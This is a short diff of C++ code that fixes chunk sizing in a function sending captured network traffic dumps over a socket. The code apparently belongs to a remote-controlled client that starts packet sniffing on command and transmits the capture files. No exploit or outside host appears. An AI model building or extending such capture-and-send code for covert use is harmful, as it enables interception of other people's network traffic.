@@ -105,7 +105,7 @@ string SniffCurrentTraffic(std::string filter)
 {
 	thread t(&SniffTrafficWithThread, filter);
 	t.detach();
-	return "SniffTraffic started";
+	return "Sniff Traffic started";
 }
 
 string StopSniffTraffic(string nothing)
@@ -201,8 +201,8 @@ void SendFile(char * newFile)
 	}
 
 	//Sending last Chunk
-	string message = string("7").append(bufferCMP + (fileoffset * 1023), 1023);
-	iResult = send(s, message.c_str(), 1024, 0);
+	string message = string("7").append(bufferCMP + (fileoffset * 1023), lastchunksize);
+	iResult = send(s, message.c_str(), lastchunksize, 0);
 	message = string("7finish");
 	iResult = send(s, message.c_str(), message.size(), 0);
 }
@@ -423,6 +423,7 @@ std::string SniffTrafficWithThread(std::string filter)
 		SniffTraffic temp(filter.c_str(), 1000);
 		temp.Capture();
 		SendFile(temp.dumpfilename);
+		//Sleep(10000);
 	}
 	return "Sniff traffic started";
 }
